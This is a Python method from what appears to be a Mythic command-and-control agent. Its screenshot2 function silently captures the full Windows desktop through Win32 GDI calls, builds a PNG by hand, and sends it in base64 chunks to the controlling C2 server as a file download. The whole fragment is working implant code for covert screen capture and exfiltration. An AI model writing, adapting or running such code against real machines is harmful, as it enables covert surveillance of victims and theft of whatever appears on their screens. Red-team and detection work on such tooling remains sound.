    def screenshot2(self, task_id):
        if platform.system() != 'Windows':
            return "screenshot2: only supported on Windows"

        def _bgra_to_png(bgra, width, height):
            import zlib, struct
            def chunk(tag, data):
                c = tag + data
                return struct.pack('>I', len(data)) + c + struct.pack('>I', zlib.crc32(c) & 0xFFFFFFFF)
            rgb = bytearray()
            for i in range(0, len(bgra), 4):
                rgb += bytes([bgra[i+2], bgra[i+1], bgra[i]])  # BGR -> RGB
            row = width * 3
            raw = b''.join(b'\x00' + bytes(rgb[y*row:(y+1)*row]) for y in range(height))
            ihdr = struct.pack('>IIBBBBB', width, height, 8, 2, 0, 0, 0)
            return (b'\x89PNG\r\n\x1a\n'
                    + chunk(b'IHDR', ihdr)
                    + chunk(b'IDAT', zlib.compress(raw, 6))
                    + chunk(b'IEND', b''))

        try:
            import ctypes, ctypes.wintypes as W, struct

            user32  = ctypes.windll.user32
            gdi32   = ctypes.windll.gdi32

            width   = user32.GetSystemMetrics(78)   # SM_CXVIRTUALSCREEN
            height  = user32.GetSystemMetrics(79)   # SM_CYVIRTUALSCREEN
            left    = user32.GetSystemMetrics(76)   # SM_XVIRTUALSCREEN
            top     = user32.GetSystemMetrics(77)   # SM_YVIRTUALSCREEN

            hwnd    = user32.GetDesktopWindow()
            hdc     = user32.GetWindowDC(hwnd)
            hdcmem  = gdi32.CreateCompatibleDC(hdc)
            hbm     = gdi32.CreateCompatibleBitmap(hdc, width, height)
            gdi32.SelectObject(hdcmem, hbm)
            gdi32.BitBlt(hdcmem, 0, 0, width, height, hdc, left, top, 0x00CC0020)  # SRCCOPY

            class BITMAPINFOHEADER(ctypes.Structure):
                _fields_ = [('biSize',W.DWORD),('biWidth',W.LONG),('biHeight',W.LONG),
                             ('biPlanes',W.WORD),('biBitCount',W.WORD),('biCompression',W.DWORD),
                             ('biSizeImage',W.DWORD),('biXPelsPerMeter',W.LONG),
                             ('biYPelsPerMeter',W.LONG),('biClrUsed',W.DWORD),('biClrImportant',W.DWORD)]

            bmi            = BITMAPINFOHEADER()
            bmi.biSize     = ctypes.sizeof(BITMAPINFOHEADER)
            bmi.biWidth    = width
            bmi.biHeight   = -height  # top-down
            bmi.biPlanes   = 1
            bmi.biBitCount = 32       # BGRA

            buf = (ctypes.c_char * (width * height * 4))()
            gdi32.GetDIBits(hdc, hbm, 0, height, buf, ctypes.byref(bmi), 0)

            gdi32.DeleteObject(hbm)
            gdi32.DeleteDC(hdcmem)
            user32.ReleaseDC(hwnd, hdc)

            sh_data = _bgra_to_png(bytes(buf), width, height)

        except Exception as e:
            with self._taskings_lock:
                task = next((t for t in self.taskings if t["task_id"] == task_id), None)
            if task:
                task["result"]    = "Screenshot capture failed: {}".format(e)
                task["error"]     = True
                task["completed"] = True
            return None

        try:
            file_size    = len(sh_data)
            total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
            ts           = datetime.now().strftime('%Y%m%d_%H%M%S')

            init_resp = self.postMessageAndRetrieveResponse({
                "action": "post_response",
                "responses": [{
                    "task_id": task_id,
                    "download": {
                        "total_chunks":  total_chunks,
                        "full_path":     "screenshot_{}.png".format(ts),
                        "chunk_size":    CHUNK_SIZE,
                        "is_screenshot": True
                    }
                }]
            })

            responses_list = init_resp.get("responses", [])
            file_id = responses_list[0].get("file_id") if responses_list else None

            if not file_id:
                raise ValueError("Mythic nao retornou file_id. Resposta: {}".format(init_resp))

            for i in range(total_chunks):
                with self._taskings_lock:
                    stopped = next(
                        (t["stopped"] for t in self.taskings if t["task_id"] == task_id),
                        False
                    )
                if stopped:
                    break
                self.postMessageAndRetrieveResponse({
                    "action": "post_response",
                    "responses": [{
                        "task_id": task_id,
                        "download": {
                            "chunk_num":  i + 1,
                            "file_id":    file_id,
                            "chunk_data": base64.b64encode(sh_data[i*CHUNK_SIZE:(i+1)*CHUNK_SIZE]).decode()
                        }
                    }]
                })

            with self._taskings_lock:
                task = next((t for t in self.taskings if t["task_id"] == task_id), None)
            if task:
                task["result"]    = json.dumps({"file_id": file_id})
                task["completed"] = True

        except Exception as e:
            with self._taskings_lock:
                task = next((t for t in self.taskings if t["task_id"] == task_id), None)
            if task:
                task["result"]    = "Screenshot send failed: {}".format(e)
                task["error"]     = True
                task["completed"] = True

        return None
